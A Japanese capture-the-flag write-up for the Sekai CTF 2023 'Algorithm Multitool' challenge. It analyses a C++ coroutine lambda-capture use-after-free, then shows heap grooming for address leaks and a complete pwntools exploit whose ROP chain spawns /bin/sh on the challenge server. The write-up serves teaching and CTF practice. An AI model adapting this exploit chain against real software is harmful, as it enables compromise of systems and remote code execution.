---
layout: page
title: "Sekai CTF 2023 Algorithm Multitool"
date: 2023-09-03 00:00:00 -0000
---

- 問題のソースは[これ](https://github.com/project-sekai-ctf/sekaictf-2023/blob/main/pwn/algorithm-multitool/challenge/multitool.cpp)です。
- 作成したスクリプトは[ここ](https://github.com/jt00000/ctf.writeup/blob/5290c0d2d002597ca8ef5e8f5663c227e95d4da5/sekai2023/multi/solve.py)にあります。
- ラムダ関数でcoroutineを作るとき、キャプチャを使って変数を取り込むとUAFになるというバグを扱っています。　

coroutineを使った問題の解法をまとめています。

# coroutineの動作の確認
coroutineは関数の動作を一時中断し、その状態を保持することができるオブジェクトです。内部に`co_await`や`co_return`を持つ関数はcoroutine関数になり、内部にステートを持ち、呼び出すたびに挙動が変わります。

coroutineの関数を呼び出すと、関数の処理が始まる手前で止まり、`resume`メソッドを使って処理を再開します。`co_return`まで処理が進んだらこのオブジェクトは破棄されます。

coroutineのキーワードを持った関数は内部にその機能が埋められます。しかし具体的に何が埋められるか、該当のソースコードを見つけられなかったため、またghidraも上手くデコンパイルできなさそうだったため、生成されたバイトコードから直接動きを解釈しました。

まずこの問題のソースの一部です。`co_await`が使われていて、このラムダの部分がcoroutine関数になります。

```c
auto slow_algo_factory(SlowAlgo* algo)
{
    algo->get_algo_params();
    auto h = [algo_l = algo]() -> Task
    {
        co_await run_algo_async(algo_l);
        std::cout << "Result: " << algo_l->get_result() << std::endl;
        co_return;
    };
    return h;
}
```

ラムダを抱えた`slow_algo_factory`ですが、`get_algo_params`が呼ばれたあとreturnし、直後に`slow_algo_factory(SlowAlgo*)::{lambda()#1}::operator()() const`という名前の関数が呼ばれて、初期化の処理が始まります。内容は以下の通りです。メンバ名は分からないものは適当につけています。

- coroutineハンドラ用の0x40のメモリを確保する
- 2つの関数ポインタ`.actor`、`.destroy`を格納する
- ラムダでキャプチャしたAlgo構造体を格納する
- フラグの設定をしてから一度`.actor`を呼び出す。
- 以降`resume`を呼び出すと、中で`.actor`が呼ばれる。`destroy`が呼ばれると、中で`.destroy`が呼ばれる。

`.actor`は内部状態 `state`を使って、以下のように動きます。

| state | Action | 
| -- | -- |
| 0 | coroutineハンドルを生成し、`initial_suspend`を呼び出す。`state`を2へ。 |
| 2 | `co_await`の対象になっている関数`run_algo_async`を呼び出す。`state`を4へ。 |
| 4 | `algo_l->get_result()`を呼び出す。`state`を6へ。`.actor`へのポインタを削除。 |
| 6 | オブジェクトをdeleteする。 |
| 1 | オブジェクトをdeleteする。 |
| 3 | オブジェクトをdeleteする。 |
| 5 | オブジェクトをdeleteする。 |
| 7 | オブジェクトをdeleteする。 |

`.destroy`は、`state |= 1`した後で、`.actor`を呼び出す動きをします。（`state`が奇数側のときは、それぞれの段階で必要なデストラクタ処理ができるように分かれてるのだと思いますが、今回はすべて同じところに飛んでいます。）

最初に呼ばれたときや`resume`を使って呼ばれるときは`.actor`が使われ、destroyメソッドが呼ばれたときは`.destroy`が使われます。

coroutineハンドルの実際のメモリの様子は以下の通りです。

```
0x555555742410: 0x0000000000000000      0x0000000000000051
0x555555742420: 0x00005555555c2f50      0x00005555555c32b0 [ .actor | .destroy ]
0x555555742430: 0x0000000000000000      0x0000555555742420 [        | loopback ]
0x555555742440: 0x00007fffffffdd00      0x0000000000010002 [ algo_l | flags| state ]
0x555555742450: 0x0000000000000000      0x0000000000000000
```

- +0: slow_algo_factory(SlowAlgo*)::{lambda()#1}::operator()(slow_algo_factory(SlowAlgo*)::{lambda()#1}::operator()() const::_ZZ17slow_algo_factoryP8SlowAlgoENKUlvE_clEv.Frame*) [clone .actor]
- +8: slow_algo_factory(SlowAlgo*)::{lambda()#1}::operator()(slow_algo_factory(SlowAlgo*)::{lambda()#1}::operator()() const::_ZZ17slow_algo_factoryP8SlowAlgoENKUlvE_clEv.Frame*) [clone .destroy]
- +0x18: 自身を指すポインタ
- +0x20: キャプチャされた`algo_l`変数
- +0x28: ステート。2バイトが`state`、次の1バイト、1バイトでそれぞれ何らかのフラグ

ここまでがcoroutineの動作の確認です。coroutineはキーワードを埋めることで、遷移状態を管理するためのいくつかのコードが追加されます。

# Algorithm Multitoolのバグ
次にこの問題のバグの説明をします。ここではcoroutineを使って複数のアルゴリズムを実行するタスクを生成、実行、削除することができます。

そしてバグは、再掲のソースですが、以下のラムダで引数をキャプチャしてしまっているところがバグになります。[参考](https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#Rcoro-capture)

```c
auto slow_algo_factory(SlowAlgo* algo)
{
    algo->get_algo_params();
    auto h = [algo_l = algo]() -> Task // <--
    {
        co_await run_algo_async(algo_l);
        std::cout << "Result: " << algo_l->get_result() << std::endl;
        co_return;
    };
    return h;
}
```

Task構造体の`h`は、`algo_l`のライフタイムを無視してそのアドレスを持ち続けるため、最初の呼び出しのあと、`algo_l`はダングリングになります。別の関数を使うと、`algo_l`のポインタを差し替えることができます。

# Exploit作成
`slow_algo_factory`を使って生成されたタスクは、以降それぞれ1度目の`resume`で`run_algo_async`が、2度目の`resume`で`get_result`が動作します。これらと、`algo_l`の差し替えを使ってうまく攻撃を組み立てます。

まず`get_result`は`algo_l`から+0x48のところをstringと思って出力します。これを使えば、任意の文字列を出力することができそうです。（+0x48はAlgo::resultが置かれているところ）

```
   0x00005555555c7bc0 <+0>:     endbr64 
   0x00005555555c7bc4 <+4>:     push   rbp
   0x00005555555c7bc5 <+5>:     mov    rbp,rsp
   0x00005555555c7bc8 <+8>:     sub    rsp,0x10
   0x00005555555c7bcc <+12>:    mov    QWORD PTR [rbp-0x8],rdi
   0x00005555555c7bd0 <+16>:    mov    QWORD PTR [rbp-0x10],rsi
   0x00005555555c7bd4 <+20>:    mov    rax,QWORD PTR [rbp-0x10]
   0x00005555555c7bd8 <+24>:    lea    rdx,[rax+0x48]                <--
   0x00005555555c7bdc <+28>:    mov    rax,QWORD PTR [rbp-0x8]
   0x00005555555c7be0 <+32>:    mov    rsi,rdx
   0x00005555555c7be3 <+35>:    mov    rdi,rax
   0x00005555555c7be6 <+38>:    call   0x5555555ca2e6 <std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::basic_string(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&)>
   0x00005555555c7beb <+43>:    mov    rax,QWORD PTR [rbp-0x8]
   0x00005555555c7bef <+47>:    leave  
   0x00005555555c7bf0 <+48>:    ret
```

また1度目の`resume`は別スレッド側で`run_algo_async`が動きますが、ここはダングリングになるスタック変数がキャプチャされています。（実装自体は正しいはずです。）

```c
auto run_algo_async(Algo* algo)
{
    struct awaitable
    {
        Algo* algo;;
        bool await_ready() { return false; }
        void await_suspend(std::coroutine_handle<> h)
        {
            std::jthread([i = algo] {  // <--
                bool res = i->do_algo();
                if(!res) {
                    std::cerr << "Error" << std::endl;
                    exit(-1);
                }
            });
        }
        void await_resume() {}
    };
    return awaitable{algo};
}
```

`do_algo`の呼び出しが、スタック変数のポインタから行われています。アドレスが判明していれば、ここからIPが取れそうです。うれしいことに`rdi`もコントロールできそうです。

```
Dump of assembler code for function operator()() const:
   0x0000555555557664 <+0>:     push   rbp
   0x0000555555557665 <+1>:     mov    rbp,rsp
   0x0000555555557668 <+4>:     sub    rsp,0x20
   0x000055555555766c <+8>:     mov    QWORD PTR [rbp-0x18],rdi
   0x0000555555557670 <+12>:    mov    rax,QWORD PTR [rbp-0x18]
   0x0000555555557674 <+16>:    mov    rax,QWORD PTR [rax]
   0x0000555555557677 <+19>:    mov    rax,QWORD PTR [rax]
   0x000055555555767a <+22>:    add    rax,0x18
   0x000055555555767e <+26>:    mov    rdx,QWORD PTR [rax]
   0x0000555555557681 <+29>:    mov    rax,QWORD PTR [rbp-0x18]
   0x0000555555557685 <+33>:    mov    rax,QWORD PTR [rax]
   0x0000555555557688 <+36>:    mov    rdi,rax
   0x000055555555768b <+39>:    call   rdx
```

肝心のスタック変数の差し替えですが、この問題では差し替え方が2通りに限定されています。

1. タスクAを`slow_algo_factory`で生成し、別のタスクBを`resume`すると、直前に生成したタスクAのAlgo構造体が`algo_l`として呼ばれる。
2. タスクAを`destroy`し、別のタスクBを`resume`すると、消したタスクAの*Task*構造体があったアドレスへのポインタが`algo_l`として呼ばれる。（正確には`destroy`のパスで使われている`tasks.begin()+index`の戻り値）

自由に値を入れ替えらえる2.を使いたいので、どうにかして`destroy`を呼び出した後にポインタ先をいい感じに書き換えたいです。1.があるので`slow_algo_factory`を使ったタスク生成はできませんが、`fast_algo_factory`は同じようにタスクを生成しますがスタックの深さの違いで影響しないようになっていますので、これを利用してヒープを編集します。

ヒープ編集のアイデアですが、2.のポインタは`tasks`というベクタの中を指します。よってタスクを増やしてサイズを伸ばしてあげることでresizeされて、いい感じになっているチャンクを`tasks`に使わせたり、逆に元のチャンクが使えるようになります。

## リーク
`get_result`を使ったリークですが、先ほど書いた通り、`task[index]`から+0x48のところにポインタ、+0x50のところにいい感じの整数が並んでいれば、そのポインタがstringとして解釈されて出力を得られます。適当にいろんなアルゴリズムのタスクを生成してみてヒープを観察したところ、coinchangeのAlgo構造体がいい感じのメンバを持っています。

以下のようにパラメータを入れたとき、メモリマップはその下のようになります。ベクタが拡張した時のサイズである0x90のチャンクの下の方に、ポインタと、+8のところに要素数が入ります。

```
N: 10
Coins: 1 2 3 4 5 6 7 8 9 10
Amount to calculate: 13
```

```
0x555555578fa0: 0x0000000000000001      0x0000000000000091
0x555555578fb0: 0x0000555555565a68      0x0000555555578fc8
0x555555578fc0: 0x000000000000000b      0x616843206e696f43
0x555555578fd0: 0x000000000065676e      0x0000555555578fe8
0x555555578fe0: 0x000000000000000e      0x676c4120776f6c53
0x555555578ff0: 0x00006d687469726f      0x0000555555579008
0x555555579000: 0x0000000000000000      0x0000000000000000
0x555555579010: 0x0000000000000000      0x0000555555579560　<--
0x555555579020: 0x000000000000000a      0x000000000000000d
0x555555579030: 0x0000000000000000      0x0000000000000091
```

先にこの構造体を使ってfreeした後、tasksを拡張して、`resume`、`destroy`、`resume`の順に呼ぶことで、resizeした後のベクタにこのチャンクを使わせます。

リークまでのスクリプトは以下の通りです。（各関数はパラメータを入れているだけですので一旦省略）

10個目のタスクを追加する時に`tasks`のチャンクのサイズが0x50から0x90になるので、事前にcoinchangeのタスクをfreeしておいて、10個目を追加してresizeを起こしてこのチャンクへ移動させ、さらに4番目のアルゴリズムを`destroy`することで、そこから+0x48の上記のポインタを読ませます。

```python
coin([0x1111]*180, 0xbeef) # large chunk for leak
bubble([1])

fib(1)
fib(1)
fib(1)
bubble([1]) # place slow_algo to slot #5 --> #4 --> delete
fib(1)
fib(1)

destroy(0) # free 0x90
bubble([1])

fib(1)
fib(1) # resize tasks to 0x90

resume(7) # resume once
destroy(4) # corrupt algo_l
resume(6) # resume again
```

フィボナッチのAlgo構造体あたりが丸々リークします。最初のcoinchangeの配列をもっと大きくするとlibcもリークすると思いますが、今回は必要ないので省略します。

```
    b'Resume task #: '
[DEBUG] Sent 0x2 bytes:
    b'6\n'
[DEBUG] Received 0xe5 bytes:
    00000000  52 65 73 75  6c 74 3a 20  78 32 3c ac  b3 55 00 00  │Resu│lt: │x2<·│·U··│
    00000010  28 10 15 ad  b3 55 00 00  0b 00 00 00  00 00 00 00  │(···│·U··│····│····│
    00000020  42 75 62 62  6c 65 20 53  6f 72 74 00  00 00 00 00  │Bubb│le S│ort·│····│
    00000030  48 10 15 ad  b3 55 00 00  0e 00 00 00  00 00 00 00  │H···│·U··│····│····│
    00000040  53 6c 6f 77  20 41 6c 67  6f 72 69 74  68 6d 00 00  │Slow│ Alg│orit│hm··│
    00000050  68 10 15 ad  b3 55 00 00  02 00 00 00  00 00 00 00  │h···│·U··│····│····│
    00000060  31 20 00 00  00 00 00 00  11 11 00 00  00 00 00 00  │1 ··│····│····│····│
    00000070  50 16 15 ad  b3 55 00 00  01 00 00 00  00 00 00 00  │P···│·U··│····│····│
    00000080  81 00 00 00  00 00 00 00  58 31 3c ac  b3 55 00 00  │····│····│X1<·│·U··│
    00000090  a8 10 15 ad  b3 55 00 00  09 00 00 00  00 00 00 00  │····│·U··│····│····│
    000000a0  46 69 62 6f  6e 61 63 63  69 00 00 00  00 00 00 00  │Fibo│nacc│i···│····│
    000000b0  c8 10 15 ad  b3 55 00 00  0e 00 00 00  0a 44 6f 6e  │····│·U··│····│·Don│
    000000c0  65 21 0a 31  2e 20 43 72  65 61 74 65  20 6e 65 77  │e!·1│. Cr│eate│ new│
    000000d0  20 74 61 73  6b 0a 32 2e  20 52 65 73  75 6d 65 20  │ tas│k·2.│ Res│ume │
    000000e0  74 61 73 6b  0a                                     │task│·│
    000000e5
```
## IPコントロール
次に`run_algo_async`を使ったIP奪取です。今度は先ほどと異なりオフセット+0のポインタが使われるため、有効なtasksを指されると面倒です。そこで先に`destroy`を呼び、その後にresizeを起こしてtasksを移動させ、元のtasksポインタ跡地を書き換えたあとで`resume`することで、古いtasksがあったところを指した状態で動作させます。resizeの後には`fast_algo_factory`を使ってペイロードを設置します。

最初のresizeで0x90のサイズがfreeされますが少し使いにくかったので、その次の0x110のサイズを狙いました。

```python
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './multitool'
HOST = 'chals.sekai.team'
PORT = 4020

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	script += "set print asm-demangle on\n"
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()

def bubble(arr):
    r.sendlineafter(b'Choice: ', b'1')
    r.sendlineafter(b'Choice: ', b'2')
    r.sendlineafter(b'N: ', str(len(arr)).encode())
    r.sendlineafter(b'Numbers: ', ' '.join([str(x) for x  in arr]).encode())

def coin(arr, am):
    r.sendlineafter(b'Choice: ', b'1')
    r.sendlineafter(b'Choice: ', b'3')
    r.sendlineafter(b'N: ', str(len(arr)).encode())
    r.sendlineafter(b'Coins: ', ' '.join([str(x) for x  in arr]).encode())
    r.sendlineafter(b'late: ', str(am).encode())

def cbc(pt):
    r.sendlineafter(b'Choice: ', b'1')
    r.sendlineafter(b'Choice: ', b'1')
    r.sendlineafter(b'text: ', pt)

def subs(haystack, needle):
    r.sendlineafter(b'Choice: ', b'1')
    r.sendlineafter(b'Choice: ', b'4')
    r.sendlineafter(b'stack: ', haystack)
    r.sendlineafter(b'Needle: ', needle)

def gcd(v0, v1):
    r.sendlineafter(b'Choice: ', b'1')
    r.sendlineafter(b'Choice: ', b'5')
    r.sendlineafter(b'number: ', str(v0).encode())
    r.sendlineafter(b'number: ', str(v1).encode())

def linear(arr, s):
    r.sendlineafter(b'Choice: ', b'1')
    r.sendlineafter(b'Choice: ', b'6')
    r.sendlineafter(b'N: ', str(len(arr)).encode())
    r.sendlineafter(b'Numbers: ', ' '.join([str(x) for x  in arr]).encode())
    r.sendlineafter(b'number: ', str(s).encode())

def binary(arr, s):
    r.sendlineafter(b'Choice: ', b'1')
    r.sendlineafter(b'Choice: ', b'7')
    r.sendlineafter(b'N: ', str(len(arr)).encode())
    r.sendlineafter(b'Numbers: ', ' '.join([str(x) for x  in arr]).encode())
    r.sendlineafter(b'number: ', str(s).encode())

def fib(n):
    r.sendlineafter(b'Choice: ', b'1')
    r.sendlineafter(b'Choice: ', b'8')
    r.sendlineafter(b'N: ', str(n).encode())

def resume(idx):
    r.sendlineafter(b'Choice: ', b'2')
    r.sendlineafter(b'#: ', str(idx).encode())

def destroy(idx):
    r.sendlineafter(b'Choice: ', b'3')
    r.sendlineafter(b'#: ', str(idx).encode())

# leak heap, pie
coin([0x1111]*180, 0xbeef) # large chunk for leak
bubble([1])

fib(1)
fib(1)
fib(1)
bubble([1]) # place slow_algo to slot #5 --> #4 --> delete
fib(1)
fib(1)

destroy(0) # free 0x90
bubble([1])

fib(1)
fib(1) # resize tasks to 0x90

resume(7)
destroy(4)

resume(6)
r.recvuntil(b'Result: ')
leak = u64(r.recv(8))
dbg('leak')
pie = leak - 0x1b4278
dbg('pie')

leak = u64(r.recv(8))
dbg('leak')
heap = leak - 0x13028
dbg('heap')

# resize tasks again 
for _ in range(10):
    fib(1)

# delete another slow_algo
destroy(6)

# resize tasks to skip 0x90 sized chunk
for _ in range(15):
    fib(1)

fake = heap + 0x14490 + 0x30
setrdx = pie + 0x00150718#: mov rdx, [rax+0x28]; mov rax, [rax+0x30]; mov [rdi+0x38], rdx; mov [rdi+0x40], rax; ret;
syscall = pie + 0x0009a1a6
leave = pie + 0x0015e4d4
pivot = pie + 0x0010b4d7#: mov rbp, rdi; call qword ptr [rax+0x10];
p2 = pie + 0x0015f7a5
rdi = pie + 0x0015f7a8
rax = pie + 0x0015cc2d
rsi = pie + 0x0015fc65

payload = [i for i in range(33)]
payload[6+0] = fake
payload[6+1] = p2
payload[6+2] = leave
payload[6+3] = pivot
payload[6+4] = rax
payload[6+5] = fake+0x80
payload[6+6] = rdi
payload[6+7] = fake-0x40
payload[6+8] = setrdx
payload[6+9] = rsi
payload[6+10] = 0
payload[6+11] = rdi
payload[6+12] = fake + 8*16
payload[6+13] = rax
payload[6+14] = 0x3b
payload[6+15] = syscall
payload[6+16] = u64(b'/bin/sh\x00')

payload[6+21] = 0

# retake 0x110 sized chunk ( = old tasks ) and place our payload
binary(payload, 0x1)

if args.D:
	#debug(r, [0x77740,0x6f134, 0x6e99b, 0x6f11c])
	debug(r, [0x6e98e])

resume(0)
r.interactive()
r.close()
```

ちなみに最初のリーク部分の想定解は「fast_algoで16桁以上の数字を返させる。」だったようで、16桁以上表示するとstringがポインタを持つことを利用して、これがラムダの外で壊れてから表示されるのでヒープが漏れるという内容です。とてもかしこい。
